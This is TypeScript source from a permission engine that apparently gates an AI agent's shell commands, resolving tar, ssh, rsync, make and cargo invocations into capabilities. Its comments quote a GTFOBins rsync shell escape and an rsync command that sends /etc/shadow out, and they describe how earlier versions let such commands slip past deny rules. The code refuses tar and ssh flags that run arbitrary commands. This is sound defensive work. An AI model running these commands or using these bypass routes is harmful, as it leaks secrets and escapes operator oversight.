  const positional = stripFlags(tokens, MKTEMP_VALUE_FLAGS);

  if (tmpdir !== null) {
    // Filter tmpdir out of positional in case the space-separated
    // form leaked through.
    const templates = positional.filter((p) => p !== tmpdir);
    if (templates.length === 0) {
      // -p DIR with no template — mktemp picks a default template
      // like `tmp.XXXXXX`. Emit write-fs(DIR) as the broader scope.
      return {
        capabilities: [writeFs(resolveArg(tmpdir, ctx))],
        confidence: 'high',
      };
    }
    const resolvedDir = resolveArg(tmpdir, ctx);
    return {
      capabilities: templates.map((p) => writeFs(resolvePath(resolvedDir, p))),
      confidence: 'high',
    };
  }

  return emitTargetsAsWrites(positional, ctx);
};

// `cd` is a builtin; in a tool-call context the cwd change doesn't
// persist between invocations, so there's no observable fs side
// effect.
//
// Slice 152 (review calibration): pre-slice cmdCd emitted
// `readFs(target)`. The reasoning was "for completeness" — but
// `cd /etc` doesn't read /etc/*, only validates the dir exists
// and is searchable (the chdir syscall). The false read-fs
// poisoned downstream score calculations: `cd /etc` looked like
// `cat /etc/passwd` to the score gate, tripping `workspace_escape`
// (+0.15) and potentially `classifyProtectedPath`-driven
// escalation on `/etc/agent`. Operators saw confirm prompts for
// noop directory changes. Emit an empty capability set instead —
// the chdir itself is observable to the surrounding bash command,
// but the resolver's job is to characterize SIDE EFFECTS, and
// cd has none in tool-call context.
const cmdCd: CommandResolver = () => ({
  capabilities: [],
  confidence: 'high',
});

// ─── Slice 120 (R2 #199) — archive / remote / build resolvers ───
//
// Pre-slice the registry lacked entries for `tar`, `tee`, `ssh`,
// `scp`, `rsync`, `make`, `cargo` — all common operator commands
// that fell through to the `unknown_command` Refuse path. The
// fall-through is safe (no capability leak) but ergonomically
// hostile: every `tar -cf release.tar dist/` popped a manual-
// confirm modal instead of an audited Allow with the correct
// capability shape.
//
// Each resolver here returns the narrowest honest capability set
// the command's flag schema admits. Confidence is `medium` for
// shapes that can't be fully resolved statically (archive
// traversal targets, Makefile recipes, build.rs scripts) and
// `high` for shapes that ARE statically determined (tee writes
// to its positionals).

// `tee [-a] FILE...` — copies stdin to stdout AND to each FILE.
// No filesystem read implied (stdin is upstream-fed). Each
// positional is a write target. `-a` only changes append vs
// truncate; the capability shape is the same.
const cmdTee: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    // No targets — copies stdin to stdout only. No fs side effect.
    return { capabilities: [], confidence: 'high' };
  }
  return {
    capabilities: positional.map((p) => writeFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// `tar` — three modes (create/extract/list) with very different
// capability shapes. The short-flag bundle `-czf`/`-xvf`/`-tvf`
// is the canonical operator form on every Unix; we decode it
// here instead of relying on stripFlags's positional-only view.
//
// Flag schema we honor:
//   -c / --create        → create mode
//   -x / --extract       → extract mode
//   -t / --list          → list mode
//   -f <path> / --file=  → archive path (consumed from positionals)
//   -C <path> / --directory= → output dir for extract (consumed)
//
// Compression flags (`-z`/`-j`/`-J`/`--gzip` etc.) don't change
// the capability shape and are ignored.
//
// Capability shape per mode:
//   create  → write-fs(archive), read-fs(each input path)
//   extract → read-fs(archive),  write-fs(output dir or cwd)
//   list    → read-fs(archive)
//   unknown → read-fs(cwd) + write-fs(cwd) at medium confidence
//             (defensive: a malformed invocation could still do
//             anything; let the operator's modal decide).
//
// Out of scope: path-traversal-in-archive (a crafted archive
// can extract `../../etc/passwd`). The resolver can't see the
// archive contents at planning time; the sandbox profile and §11
// classifier together still mask the extraction destination.
// Confidence stays `medium` to flag the inherent uncertainty.
const cmdTar: CommandResolver = (positional, tokens, ctx) => {
  // Slice 125 (R2 P0-1): GTFOBins arbitrary-exec flags. Documented
  // tar flags whose value is a SHELL COMMAND, not a path:
  //   --checkpoint-action=exec=<cmd>  — runs <cmd> at each checkpoint
  //   --use-compress-program=<cmd>    — pipes the archive through <cmd>
  //   --to-command=<cmd>              — runs <cmd> for each entry
  // Pre-slice the resolver treated these as ordinary `--flag=value`
  // pairs; the protected-path classifier saw `exec=rm-rf` as a path
  // candidate under cwd, didn't match a deny zone, and cmdTar
  // emitted a normal tar shape. A narrow `tar` allow rule would
  // admit arbitrary local exec via any of these. Symmetric to ssh's
  // ProxyCommand refuse — hard refuse the lot.
  for (const t of tokens) {
    if (t.startsWith('--checkpoint-action=')) {
      const value = t.slice('--checkpoint-action='.length);
      // `--checkpoint-action=exec=<cmd>` is the exploit; other
      // values (sleep, ttyout, dot, totals, bell) are benign.
      if (value.startsWith('exec=') || value === 'exec') {
        return {
          refuse:
            'tar: --checkpoint-action=exec=<cmd> runs an arbitrary command — refusing static analysis',
        };
      }
    }
    if (t === '--checkpoint-action') {
      // Space-separated form. The action value can be `exec=<cmd>`
      // (arbitrary-exec — the exploit), `sleep`, `dot`, `bell`, etc.
      // Refuse unconditionally regardless of the value because every
      // shape requires runtime inspection to safely characterize.
      return {
        refuse:
          'tar: --checkpoint-action <value> requires runtime inspection — refusing static analysis',
      };
    }
    if (t === '--use-compress-program' || t.startsWith('--use-compress-program=')) {
      return {
        refuse:
          'tar: --use-compress-program executes an arbitrary program as the compressor — refusing static analysis',
      };
    }
    if (t === '--to-command' || t.startsWith('--to-command=')) {
      return {
        refuse: 'tar: --to-command runs an arbitrary command per entry — refusing static analysis',
      };
    }
    // Slice 127 (R3 P2): additional GTFOBins exec / path-read vectors
    // per `man tar` — all admit attacker-controlled exec or
    // attacker-controlled file reads via the flag value.
    if (t === '--rmt-command' || t.startsWith('--rmt-command=')) {
      return {
        refuse: 'tar: --rmt-command executes an arbitrary rmt program — refusing static analysis',
      };
    }
    if (
      t === '--info-script' ||
      t.startsWith('--info-script=') ||
      t === '--new-volume-script' ||
      t.startsWith('--new-volume-script=')
    ) {
      return {
        refuse:
          'tar: --info-script / --new-volume-script run an arbitrary command at volume change — refusing static analysis',
      };
    }
    if (t === '--owner-map' || t.startsWith('--owner-map=')) {
      return {
        refuse:
          'tar: --owner-map reads an attacker-controllable mapping file — refusing static analysis',
      };
    }
    if (t === '--group-map' || t.startsWith('--group-map=')) {
      return {
        refuse:
          'tar: --group-map reads an attacker-controllable mapping file — refusing static analysis',
      };
    }
    if (t === '-I') {
      // Short-form alias for --use-compress-program.
      return {
        refuse:
          'tar: -I (alias of --use-compress-program) executes an arbitrary compressor — refusing static analysis',
      };
    }
    // Slice 127 (R3 P0-1): the bundle form `tar -zIf prog archive`
    // packs `I` into the short-flag bundle and consumes `prog` as
    // its value via positional lookahead. Pre-slice the bundle
    // decoder (further down) only inspected `c`/`x`/`t`/`f` chars;
    // `I` slipped through and the resolver emitted a normal tar
    // shape with `prog` mis-attributed as an input path. Detect
    // the bundle form here and refuse.
    if (t.startsWith('-') && !t.startsWith('--') && t.length > 1) {
      const bundle = t.slice(1);
      if (bundle.includes('I')) {
        return {
          refuse:
            'tar: -I (alias of --use-compress-program) in bundled-flag form executes an arbitrary compressor — refusing static analysis',
        };
      }
    }
  }

  let mode: 'create' | 'extract' | 'list' | 'unknown' = 'unknown';
  let archivePath: string | null = null;
  let outputDir: string | null = null;
  // Token-consumed positionals (archive path, output dir) — when
  // we later filter `positional` for input paths, these must be
  // excluded. Strings, not indices, because stripFlags renumbers.
  const consumed = new Set<string>();

  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';

    if (t === '--create') {
      mode = 'create';
      continue;
    }
    if (t === '--extract' || t === '--get') {
      mode = 'extract';
      continue;
    }
    if (t === '--list') {
      mode = 'list';
      continue;
    }
    if (t.startsWith('--file=')) {
      archivePath = t.slice('--file='.length);
      continue;
    }
    if (t === '--file') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        archivePath = next;
        consumed.add(next);
        i += 1;
      }
      continue;
    }
    if (t.startsWith('--directory=')) {
      outputDir = t.slice('--directory='.length);
      continue;
    }
    if (t === '--directory' || t === '-C') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        outputDir = next;
        consumed.add(next);
        i += 1;
      }
      continue;
    }
    // Short-flag bundles like `-czf`, `-xvf`, `-t`. Iterate
    // characters so combined forms work. `c`/`x`/`t` set mode
    // (first-write wins so `-cf` doesn't get retagged by a later
    // bundle elsewhere on the line); `f` consumes the next
    // non-flag positional as the archive path.
    if (t.startsWith('-') && !t.startsWith('--') && t.length > 1) {
      const bundle = t.slice(1);
      if (mode === 'unknown') {
        if (bundle.includes('c')) mode = 'create';
        else if (bundle.includes('x')) mode = 'extract';
        else if (bundle.includes('t')) mode = 'list';
      }
      if (bundle.includes('f')) {
        const next = tokens[i + 1];
        if (next !== undefined && !next.startsWith('-')) {
          archivePath = next;
          consumed.add(next);
        }
      }
    }
  }

  // Inputs: positionals NOT consumed by -f / -C lookahead.
  const inputs = positional.filter((p) => !consumed.has(p));

  const caps: Capability[] = [];
  if (archivePath !== null && archivePath !== '-') {
    if (mode === 'create') caps.push(writeFs(resolveArg(archivePath, ctx)));
    else caps.push(readFs(resolveArg(archivePath, ctx)));
  }

  if (mode === 'create') {
    for (const p of inputs) caps.push(readFs(resolveArg(p, ctx)));
  } else if (mode === 'extract') {
    const dest = outputDir !== null ? resolveArg(outputDir, ctx) : ctx.cwd;
    caps.push(writeFs(dest));
  } else if (mode === 'unknown') {
    // No mode flag seen — could be anything. Conservative shape.
    return {
      capabilities: [readFs(ctx.cwd), writeFs(ctx.cwd)],
      confidence: 'medium',
    };
  }
  // List mode: archive read already attributed; nothing else.

  if (caps.length === 0) caps.push(readFs(ctx.cwd));

  return { capabilities: caps, confidence: 'medium' };
};

// `ssh [opts] [user@]host [command]` — remote shell.
//
// Static-analyzable surface:
//   - destination host (positional after flag-value consumption)
//   - remote command presence (everything after host that isn't a flag)
//   - port forwarding (-L / -R / -D) → local listener side effect
//   - ProxyCommand (-o ProxyCommand=…) → spawns a LOCAL shell
//
// Capability shape:
//   - net-egress(host) — always
//   - read-fs(~/.ssh) — ssh reads known_hosts + config + keys
//     regardless of `-i` (the §11 classifier on the engine side
//     will catch this and escalate as configured by the operator)
//   - exec:arbitrary — IF a remote command is supplied (the
//     remote side can do anything; from a defense perspective the
//     spawn is dangerous even if it executes elsewhere)
//   - net-ingress(*) — IF -L / -D / -R port forwarding flags
//     present (opens local listener)
//
// Hard refuses:
//   - ProxyCommand in `-o <kv>` or `-oProxyCommand=…`: spawns a
//     LOCAL shell as a side-channel for the SSH connection,
//     ergo arbitrary local exec via an option flag — refuse
//     static analysis the same way cmdInterpreter refuses `-c`.
const cmdSsh: CommandResolver = (_positional, tokens, ctx) => {
  // Slice 125 (R2 P1): `-o LocalCommand=...` (and `-o
  // PermitLocalCommand=yes` paired with `-o LocalCommand=...`)
  // spawns a LOCAL shell as a connection-side hook, exactly like
  // ProxyCommand. KnownHostsCommand also executes a local
  // command on each connect. Refuse all three patterns. Match
  // case-insensitively but report the canonical SSH option name
  // so the operator's modal/log keeps the documented spelling.
  const localExecOpts = ['ProxyCommand', 'LocalCommand', 'KnownHostsCommand'];
  for (const t of tokens) {
    const lower = t.toLowerCase();
    for (const opt of localExecOpts) {
      const needle = `${opt.toLowerCase()}=`;
      if (lower.startsWith(needle) || lower.includes(needle)) {
        return {
          refuse: `ssh: ${opt} option spawns a local command — refusing static analysis`,
        };
      }
    }
  }

  // ssh flag schema. Numeric literals (e.g., `-p 2222`) arrive in
  // `shape.args` as `number` nodes; the resolver must consume them
  // explicitly instead of leaving them for the target-host scan.
  // Three flag classes:
  //
  //   - numericValueFlags: value is strictly numeric → peek next;
  //     consume when present.
  //   - stringValueFlags: value is always a string (path / kv / host)
  //     → peek next; consume if non-flag.
  //   - portForwardFlags: value is `[bind:]port:host:remote_port` for
  //     -L/-R, `[bind:]port` for -D, `local_tun[:remote_tun]` for -w.
  //     Slice 125: `-w` was previously in `numericValueFlags` (bare
  //     `-w 5` form), but the colon-shape `-w 0:1` keeps the value
  //     in shape.args and a host-extractor would otherwise pick
  //     `0:1` as the target. Treat -w like the other port-forward
  //     flags: peek next, consume only when the value contains `:`.
  const numericValueFlags: ReadonlySet<string> = new Set(['-p']);
  const stringValueFlags: ReadonlySet<string> = new Set([
    '-i',
    '-F',
    '-e',
    '-o',
    '-J',
    '-l',
    '-m',
    '-O',
    '-Q',
    '-W',
    '-S',
    '-c',
    '-b',
    '-I',
  ]);
  const portForwardFlags: ReadonlySet<string> = new Set(['-L', '-R', '-D', '-w']);

  // Slice 174 (review — info-leak P1). ssh's `-F <config>` (custom
  // ssh_config), `-i <identity>` (private key file), and `-S
  // <ctlsocket>` (control socket — ssh creates AND reads it) need
  // explicit readFs caps so policies denying reads from those
  // specific paths can fire (e.g., `ssh -i /tmp/exfil-key.pem` or
  // attached `ssh -i/tmp/exfil-key`). The default `readFs(~/.ssh)`
  // still fires for the implicit touches of `~/.ssh/config` /
  // `~/.ssh/known_hosts`.
  const SSH_FILE_READ_FLAGS: readonly string[] = ['-F', '-i', '-S'];
  const explicitFileReads: string[] = [];
  for (const flag of SSH_FILE_READ_FLAGS) {
    for (const v of extractValueFlag(tokens, { shortForm: flag })) {
      explicitFileReads.push(resolveArg(v, ctx));
    }
  }

  let targetIdx = -1;
  let hasPortForward = false;
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (numericValueFlags.has(t)) {
      // Consume the numeric value so the next scan iteration
      // doesn't pick it as the target host (`ssh -p 2222 host`
      // would otherwise read '2222' as the host). Skip the consume
      // when next is itself a flag (operator omitted the value —
      // malformed input; let the target scan find host).
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) i += 1;
      continue;
    }
    if (stringValueFlags.has(t)) {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        i += 1;
      }
      continue;
    }
    if (portForwardFlags.has(t)) {
      hasPortForward = true;
      const next = tokens[i + 1];
      // Three shapes the value can take:
      //   - colon-shaped (`bind:port:host:remote`) → consume.
      //   - bare numeric (`-D 8080`) → consume (else the target
      //     scan would pick '8080' as the host).
      //   - `-w any` → ssh's documented "auto-pick tun device"
      //     literal. Slice 127 (R3 P0-3) added this: pre-slice the
      //     `any` token leaked into target detection and emitted
      //     `net-egress:any`.
      // Other shapes (e.g., next is the host literal itself) →
      // don't consume; let the target scan pick it up.
      const isNumericPort = next !== undefined && /^\d+$/.test(next);
      if (next?.includes(':') || isNumericPort || (t === '-w' && next === 'any')) i += 1;
      continue;
    }
    if (t.startsWith('-')) continue;
    targetIdx = i;
    break;
  }

  if (targetIdx === -1) {
    return { refuse: 'ssh: no target host specified' };
  }

  const target = tokens[targetIdx] ?? '';
  // user@host — split on the LAST `@` so user names containing
  // `@` (rare but legal) still yield the right host.
  const atIdx = target.lastIndexOf('@');
  const host = atIdx === -1 ? target : target.slice(atIdx + 1);

  const caps: Capability[] = [netEgress(host || '*'), readFs(resolveArg('~/.ssh', ctx))];

  // Slice 174: explicit file reads from `-F` / `-i` / `-S` (control
  // socket path; ssh creates AND reads it).
  for (const p of explicitFileReads) caps.push(readFs(p));

  // Remote command: any non-flag token after the target index.
  const hasRemoteCmd = tokens.slice(targetIdx + 1).some((t) => !t.startsWith('-'));
  if (hasRemoteCmd) caps.push(exec('arbitrary'));

  if (hasPortForward) caps.push(netIngress('*'));

  return { capabilities: caps, confidence: 'medium' };
};

// `scp [opts] SOURCE... DEST` — copy via ssh.
//
// At least one of SOURCE/DEST must be remote (`[user@]host:path`);
// scp doesn't replace cp for local-local copies. We detect remote
// shape by the presence of a `:` before any `/` (Windows-style
// `C:\` shape doesn't appear in scp argv since scp doesn't run
// on Windows native CMD, and even then the colon is after the
// drive letter; here we treat `<text>:<path>` as remote when the
// text part contains no slashes).
//
// Capability shape:
//   - read-fs(~/.ssh) — scp inherits ssh's credential surface
//   - net-egress(host) — for each remote endpoint
//   - read-fs(local source) / write-fs(local dest) — for the
//     local side of the transfer
const cmdScp: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length < 2) {
    return { refuse: 'scp: needs at least source and destination' };
  }
  // `host:path` shape detection. We only flag as remote when the
  // colon appears BEFORE any `/` — so `local/path:foo` is local
  // (a literal filename containing `:`) but `host:/abs/path` and
  // `user@host:rel` are remote.
  const isRemote = (p: string): boolean => {
    const colon = p.indexOf(':');
    if (colon <= 0) return false;
    return !p.slice(0, colon).includes('/');
  };
  const extractHost = (p: string): string => {
    const left = p.slice(0, p.indexOf(':'));
    const at = left.lastIndexOf('@');
    const host = at === -1 ? left : left.slice(at + 1);
    return host || '*';
  };

  const dest = positional[positional.length - 1] as string;
  const sources = positional.slice(0, -1);
  const caps: Capability[] = [readFs(resolveArg('~/.ssh', ctx))];

  if (isRemote(dest)) {
    caps.push(netEgress(extractHost(dest)));
  } else {
    caps.push(writeFs(resolveArg(dest, ctx)));
  }
  for (const s of sources) {
    if (isRemote(s)) caps.push(netEgress(extractHost(s)));
    else caps.push(readFs(resolveArg(s, ctx)));
  }

  return { capabilities: caps, confidence: 'medium' };
};

// `rsync [opts] SOURCE... DEST` — sync files.
//
// Three transport modes:
//   - local-local (no `:` in any positional)
//   - ssh (one side has `host:path`, default transport)
//   - rsync daemon (one side has `host::module/path`, double colon)
//
// Capability shape:
//   - read-fs(local sources), write-fs(local dest)
//   - net-egress(remote host) for remote endpoints
//   - read-fs(~/.ssh) when ssh transport is in play
//   - delete-fs(local dest) when --delete or any --delete-* flag
//     is present (rsync can delete extraneous files on dest)
// rsync value-flags whose space-separated next token is a value,
// not a source/dest path. Without consuming them, `rsync --bwlimit
// 1000 src dst` would land '1000' as a positional source → bogus
// readFs:<cwd>/1000. The `=`-combined form (`--bwlimit=1000`) is
// already dropped by stripFlags's leading-dash rule. Includes
// every flag whose explicit decode is below (password-file,
// files-from, include-from, exclude-from) so the value also drops
// from the path-positional list (the decode itself emits the
// correct read-fs).
const RSYNC_VALUE_FLAGS: ReadonlySet<string> = new Set([
  // Numeric value flags
  '--bwlimit',
  '--port',
  '--timeout',
  '--contimeout',
  '--io-timeout',
  '--max-size',
  '--min-size',
  '--max-delete',
  '--max-alloc',
  '--modify-window',
  '--protocol',
  '-B',
  '--block-size',
  '--checksum-seed',
  // String non-path values (filters, formats, modes)
  '--filter',
  '-f',
  '--include',
  '--exclude',
  '--info',
  '--debug',
  '--out-format',
  '--log-format',
  '--log-file-format',
  '--chown',
  '--chmod',
  '--usermap',
  '--groupmap',
  '--checksum-choice',
  // Path-string value flags — these have explicit decodes below
  // that emit the right read/write; listing here drops the value
  // from the positional list too.
  '--password-file',
  '--files-from',
  '--include-from',
  '--exclude-from',
  '--temp-dir',
  '-T',
  '--compare-dest',
  '--copy-dest',
  '--link-dest',
  '--partial-dir',
  '--log-file',
  '--read-batch',
  '--write-batch',
  '--only-write-batch',
  // Remote-option pass-through (consumes value)
  '--remote-option',
  '-M',
]);

const cmdRsync: CommandResolver = (_positional, tokens, ctx) => {
  const positional = stripFlags(tokens, RSYNC_VALUE_FLAGS);
  // Slice 125 (R2 P0-2): rsync transport-command flags. `-e <cmd>`
  // and `--rsh=<cmd>` substitute the transport (rsync exec's the
  // literal command string + args locally — GTFOBins reference:
  //   rsync -e 'sh -c "sh -i 1>&0"' 127.0.0.1:
  // is a documented shell escape). `--rsync-path=<cmd>` runs an
  // arbitrary command on the REMOTE side. Pre-slice cmdRsync
  // acknowledged the threat in a comment but did nothing about it
  // — symmetric to ssh's ProxyCommand which slice 120 correctly
  // hard-refused; bringing rsync to parity.
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (t === '-e') {
      return {
        refuse:
          'rsync: -e sets the transport command — local shell injection vector, refusing static analysis',
      };
    }
    if (t === '--rsh' || t.startsWith('--rsh=')) {
      return {
        refuse:
          'rsync: --rsh sets the transport command — local shell injection vector, refusing static analysis',
      };
    }
    if (t === '--rsync-path' || t.startsWith('--rsync-path=')) {
      return {
        refuse:
          'rsync: --rsync-path executes an arbitrary command on the remote side — refusing static analysis',
      };
    }
  }

  if (positional.length < 2) {
    return { refuse: 'rsync: needs at least source and destination' };
  }
  const isRemote = (p: string): boolean => {
    const colon = p.indexOf(':');
    if (colon <= 0) return false;
    return !p.slice(0, colon).includes('/');
  };
  const extractHost = (p: string): string => {
    const left = p.slice(0, p.indexOf(':'));
    const at = left.lastIndexOf('@');
    const host = at === -1 ? left : left.slice(at + 1);
    return host || '*';
  };
  // `--delete`, `--delete-after`, `--delete-before`, etc. all enable
  // destination deletion.
  const hasDelete = tokens.some((t) => t === '--delete' || t.startsWith('--delete-'));

  // Slice 127 (R3 P1): `--password-file=<path>` reads daemon
  // credentials from <path>. Pre-slice the resolver attributed
  // no read-fs for this; operator allow rules on ~/.aws/passwords
  // or similar credential files never fired. Detect both `=`
  // and space-separated forms.
  let passwordFile: string | null = null;
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (t.startsWith('--password-file=')) {
      passwordFile = t.slice('--password-file='.length);
      break;
    }
    if (t === '--password-file') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) passwordFile = next;
      break;
    }
  }

  // Slice 179 (review — permission-bypass P1). `--files-from <file>`
  // and `--exclude-from <file>` / `--include-from <file>` read
  // source/filter manifests from disk. Pre-slice neither was
  // decoded — an adversarial `rsync --files-from /etc/shadow user@x:`
  // walked past `deny: read-fs:/etc/**` because the manifest read
  // was invisible. Decode both space-separated and `=` forms.
  const manifestFileReads: string[] = [];
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (t === '--files-from' || t === '--exclude-from' || t === '--include-from') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        manifestFileReads.push(next);
        i += 1;
      }
      continue;
    }
    if (
      t.startsWith('--files-from=') ||
      t.startsWith('--exclude-from=') ||
      t.startsWith('--include-from=')
    ) {
      const eqIdx = t.indexOf('=');
      const v = t.slice(eqIdx + 1);
      if (v.length > 0) manifestFileReads.push(v);
    }
  }

  // Side-effect paths that RSYNC_VALUE_FLAGS drops from the
  // positional list (so they don't leak as bogus sources) but that
  // still need to surface as capabilities. Without an explicit
  // decode here, a policy gating these paths can be bypassed.
  // extractValueFlag covers all 4 getopt shapes including attached
  // short form `-T/dir`.
  const RSYNC_WRITE_PATH_SPECS: readonly { longForm: string; shortForm?: string }[] = [
    { longForm: '--log-file' },
    { longForm: '--write-batch' },
    { longForm: '--only-write-batch' },
    { longForm: '--temp-dir', shortForm: '-T' },
    { longForm: '--partial-dir' },
  ];
  const RSYNC_READ_PATH_SPECS: readonly { longForm: string; shortForm?: string }[] = [
    { longForm: '--read-batch' },
    { longForm: '--compare-dest' },
    { longForm: '--copy-dest' },
    { longForm: '--link-dest' },
  ];
  const flagWrites: string[] = [];
  const flagReads: string[] = [];
  for (const spec of RSYNC_WRITE_PATH_SPECS) {
    for (const v of extractValueFlag(tokens, spec)) flagWrites.push(v);
  }
  for (const spec of RSYNC_READ_PATH_SPECS) {
    for (const v of extractValueFlag(tokens, spec)) flagReads.push(v);
  }

  const dest = positional[positional.length - 1] as string;
  const sources = positional.slice(0, -1);
  const anyRemote = isRemote(dest) || sources.some(isRemote);

  const caps: Capability[] = [];
  if (anyRemote) caps.push(readFs(resolveArg('~/.ssh', ctx)));
  if (passwordFile !== null) caps.push(readFs(resolveArg(passwordFile, ctx)));
  for (const p of manifestFileReads) caps.push(readFs(resolveArg(p, ctx)));
  for (const p of flagWrites) caps.push(writeFs(resolveArg(p, ctx)));
  for (const p of flagReads) caps.push(readFs(resolveArg(p, ctx)));

  if (isRemote(dest)) {
    caps.push(netEgress(extractHost(dest)));
  } else {
    caps.push(writeFs(resolveArg(dest, ctx)));
    if (hasDelete) caps.push(deleteFs(resolveArg(dest, ctx)));
  }
  for (const s of sources) {
    if (isRemote(s)) caps.push(netEgress(extractHost(s)));
    else caps.push(readFs(resolveArg(s, ctx)));
  }

  return { capabilities: caps, confidence: 'medium' };
};

// `make [target...]` — runs recipes from a Makefile. Recipes are
// arbitrary shell; even `make help` may execute a recipe with
// side effects. We don't try to parse the Makefile — exec:arbitrary
// is the honest capability shape, matching the cmdInterpreter
// pattern for "this runs untrusted code".
const cmdMake: CommandResolver = (_positional, tokens, ctx) => {
  // Slice 179 (review — permission-bypass P2). `make -C <dir>` (and
  // `--directory=<dir>`) shifts make's working directory before any
  // Makefile read or recipe run. Pre-slice the resolver emitted
  // `readFs(ctx.cwd)` / `writeFs(ctx.cwd)` unconditionally —
  // `make -C /etc/agent target` would NOT surface `/etc/agent` to
  // the operator's policy or the §11 escalate-tier classifier.
  //
  // Last -C wins (make's actual behavior). All 4 getopt shapes
  // honored including attached short `-C/path`.
  const workDirMatches = extractValueFlag(tokens, {
    longForm: '--directory',
    shortForm: '-C',
  });
  const workDir: string | null =
    workDirMatches.length > 0 ? (workDirMatches[workDirMatches.length - 1] ?? null) : null;
  const root = workDir !== null ? resolveArg(workDir, ctx) : ctx.cwd;
  return {
    capabilities: [exec('arbitrary'), readFs(root), writeFs(root)],
    confidence: 'medium',
  };
};

// `cargo <subcommand> ...` — Rust toolchain. Subcommand-aware
// because the capability shape varies dramatically.
//
// Read-only / inspection subcommands (`tree`, `metadata`, `pkgid`,
// `help`, `--version` / `-V`) — just read-fs(cwd).
//
// `search` reaches crates.io but doesn't build.
//
// Credential subcommands (`publish`, `login`, `yank`, `owner`) —
// read ~/.cargo/credentials.toml + net-egress crates.io. No
// build.rs exec since these don't compile.
//
// Build / run / test / check / install / fetch — these can all
// execute `build.rs` arbitrary code. Cargo also writes the
// `target/` dir under cwd and reaches crates.io for deps.
const cmdCargo: CommandResolver = (positional, tokens, ctx) => {
  const sub = positional[0];
  // `--target-dir=PATH` / `--target-dir PATH` redirects the build
  // output dir. cargo's long-only flag — no short alias.
  const targetDirMatches = extractValueFlag(tokens, { longForm: '--target-dir' });
  const targetDir: string | null =
    targetDirMatches.length > 0 ? (targetDirMatches[targetDirMatches.length - 1] ?? null) : null;
  const buildOutputDir =
    targetDir !== null ? resolveArg(targetDir, ctx) : resolvePath(ctx.cwd, 'target');

  if (
    sub === 'tree' ||
    sub === 'metadata' ||
    sub === 'pkgid' ||
    sub === 'help' ||
    sub === '--version' ||
    sub === '-V'
  ) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  if (sub === 'search') {
    return {
      capabilities: [netEgress('crates.io'), readFs(ctx.cwd)],
      confidence: 'high',
    };
  }
  if (sub === 'publish' || sub === 'login' || sub === 'yank' || sub === 'owner') {
    return {
      capabilities: [readFs(ctx.cwd), readFs(resolveArg('~/.cargo', ctx)), netEgress('crates.io')],
      confidence: 'medium',
    };
  }
  // Slice 125 (R2 P1): `cargo clean` removes the build output dir.
  // Pre-slice it fell into the default branch and emitted write-fs
  // (alongside exec:arbitrary). The honest shape is delete-fs on
  // the target dir; no exec:arbitrary because clean doesn't compile.
  if (sub === 'clean') {
    return {
      capabilities: [deleteFs(buildOutputDir), readFs(ctx.cwd)],
      confidence: 'high',
    };
  }
  return {
    capabilities: [
      exec('arbitrary'),
      readFs(ctx.cwd),
      writeFs(buildOutputDir),
      netEgress('crates.io'),
    ],
    confidence: 'medium',
  };
};

const COMMAND_TABLE: ReadonlyMap<string, CommandResolver> = new Map<string, CommandResolver>([
  ['ls', cmdRead],
  ['cat', cmdRead],
  ['head', cmdReadWithSize],
  ['tail', cmdReadWithSize],
  ['wc', cmdRead],
  ['file', cmdRead],
  ['stat', cmdRead],
  ['pwd', cmdRead],
  // Read-only text / metadata filters (PERMISSION_ENGINE.md §5.2). Same
  // class as cat/wc: read path args (if any), write stdout, no exec, no
  // fs mutation. All map to `cmdRead` — which over-declares a read for
  // every positional (conservative: a non-file arg like a `tr` set or a
  // `jq` filter resolves to a harmless in-cwd read, never an
  // under-declaration). Registered so they resolve cleanly instead of
  // hitting the Conservative registry-miss path on every use. Excluded
  // by design: `sed` (-i / w writes), `awk` (system()/redirect), `xargs`
  // (exec), pagers `less`/`more` (!cmd shell-out) — those stay off the
  // registry and route to Conservative → confirm.
  ['sort', cmdRead],
  ['uniq', cmdRead],
  ['cut', cmdRead],
  ['comm', cmdRead],
  ['paste', cmdRead],
  ['tr', cmdRead],
  ['nl', cmdRead],
  ['tac', cmdRead],
  ['rev', cmdRead],
  ['fold', cmdRead],
  ['column', cmdRead],
  ['diff', cmdRead],
  ['cmp', cmdRead],
  ['jq', cmdRead],
  ['du', cmdRead],
  ['df', cmdRead],
  ['tree', cmdRead],
  ['basename', cmdRead],
  ['dirname', cmdRead],
  ['echo', cmdEcho],
  ['printf', cmdEcho],
  ['grep', cmdGrep],
  ['rg', cmdGrep],
  ['find', cmdFind],
  ['rm', cmdRm],
  ['rmdir', cmdRm],
  ['mv', cmdMvCp],
  ['cp', cmdMvCp],
  ['curl', cmdCurlWget],
  ['wget', cmdCurlWget],
  ['git', cmdGit],
  ['gh', cmdGit],
  ['npm', cmdNpmLike],
  ['yarn', cmdNpmLike],
  ['bun', cmdNpmLike],
  ['pip', cmdPip],
  ['pip3', cmdPip],
  ['pnpm', cmdNpmLike],
  ['chmod', cmdChmodChown],
  ['chown', cmdChmodChown],
  ['python', cmdInterpreter],
  ['python3', cmdInterpreter],
  ['node', cmdInterpreter],
  ['ruby', cmdInterpreter],
  ['perl', cmdInterpreter],
  // Filesystem-mutating builtins / utilities
  ['mkdir', cmdMkdir],
  ['touch', cmdTouch],
  ['ln', cmdLn],
  ['mktemp', cmdMktemp],
  // No-op / shell-level builtins
  ['sleep', cmdNoOp],
  ['true', cmdNoOp],
  ['false', cmdNoOp],
  // System-info / identity / lookup.
  //
  // Slice 152 (review calibration): split into two resolvers based
  // on whether the command actually reads /etc.
  //   cmdSysInfo      (reads /etc) — whoami / id / groups (uid →
  //                                    name via /etc/passwd /
  //                                    /etc/group), which / type
